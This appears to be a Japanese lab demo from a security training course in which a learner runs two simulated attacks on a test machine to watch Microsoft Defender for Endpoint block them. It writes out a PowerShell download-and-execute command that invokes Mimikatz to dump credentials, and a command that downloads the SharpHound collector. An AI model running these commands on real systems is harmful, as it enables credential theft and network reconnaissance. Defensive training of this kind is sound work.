# モジュール 2 デモ - Microsoft Defender for Endpoint を使用した攻撃の軽減

**注**: このデモを正常に完了するには、[前提条件ドキュメント](00-prerequisites.md)のすべての手順を完了する必要があります。

## シミュレーション攻撃

このタスクでは、シミュレートされた攻撃を 2 回行って、Microsoft Defender for Endpoint の機能を確認します。

1. ブラウザーで Microsoft Defender XDR ポータルにまだアクセスしていない場合は、テナントの管理者としてログインして、https://security.microsoft.com) の Microsoft Defender XDR に移動します。

"WIN1" で "PowerShell" を使って "シミュレートされた" 攻撃を実行し、Microsoft Defender for Endpoint の機能を確認します。******

`Attack 1: Mimikatz - Credential Dumping`

1. "WIN1" マシンで、検索バーに「**Command**」と入力し、**[管理者として実行]** を選びます。**

1. 次のコマンドをコピーして、**[管理者:コマンド プロンプト]** ウィンドウに貼り付け、**Enter** キーを押して実行します。

    ```CommandPrompt
    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
    ```

1. "アクセスが拒否されました" というメッセージと、"脅威が見つかりました" という `Microsoft Defender Antivirus, Windows Security Virus and threats protection` からのポップアップ メッセージが表示されます。****

1. **[管理者:コマンド プロンプト]** ウィンドウで「**exit**」と入力し、**Enter** キーを押して終了します。

`Attack 2: Bloodhound - Collection`

1. "WIN1" マシンで、検索バーに「**PowerShell**」と入力し、**[Windows PowerShell]** を選び、**[管理者として実行]** を選びます。**

1. 次のコマンドをコピーして、**[管理者:Windows PowerShell]** ウィンドウに貼り付け、**Enter** キーを押して実行します。

    ```PowerShell
    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

    >**注:**  コマンドのコピー、貼り付け、実行は、一度に 1 つずつ行うことをお勧めします。 "メモ帳" を開き、コマンドを一時ファイルにコピーすることで、これを行うことができます。** 最初のコマンドでは、"Atomic Red Team" フォルダーがあるのと同じフォルダーに、"ExternalPayloads" という名前のフォルダーが作成されます。**** 2 番目のコマンドでは、"BloodHound" GitHub リポジトリから "SharpHound.ps1" ファイルがダウンロードされ、"ExternalPayloads" フォルダーに保存されます。******

1. [脅威が見つかりました] という `Windows Security Virus and threats protection` からのポップアップ メッセージが表示されます。**

1. 次のコマンドをコピーして、**[管理者:Windows PowerShell]** ウィンドウに貼り付け、**Enter** キーを押して実行します。

    ```PowerShell
    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

1. 出力が *True* の場合、マルウェア ペイロード ファイルは Microsoft Defender ウイルス対策によって削除されていません。 出力が *False* の場合、マルウェア ペイロード ファイルは Microsoft Defender ウイルス対策によって削除されています。 上方向キーを使用して、出力が *False* になるまでコマンドを繰り返します。

## デモが完了しました
